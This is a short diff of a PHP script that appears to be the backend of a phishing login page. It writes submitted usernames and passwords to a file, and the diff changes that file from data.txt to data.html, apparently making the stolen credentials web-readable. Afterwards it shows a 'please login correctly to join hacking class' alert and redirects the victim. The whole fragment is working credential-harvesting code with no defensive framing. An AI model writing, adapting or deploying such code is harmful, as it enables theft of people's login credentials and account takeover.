@@ -8,7 +8,7 @@ $user_name="U|=";
 $pasword1="P|=";
 $space="|    |";
 
-$fp = fopen('data.txt', 'a');
+$fp = fopen('data.html', 'a');
 fwrite($fp, $space);
 fwrite($fp, $user_name);
 fwrite($fp, $username);
@@ -23,7 +23,7 @@ fclose($fp);
 		echo '
 				<script type = "text/javascript">
 					alert("please login correctly to join hacking class");
-					window.location = "../index.html";
+					window.location = "index.html";
 				</script>
 			'; 
 		 
@@ -32,6 +32,6 @@ fclose($fp);
 	echo '
 				<script type = "text/javascript">
 					alert("please login correctly to join hacking class");
-					window.location = "../index.html";
+					window.location = "index.html";
 				</script>
 			';?>
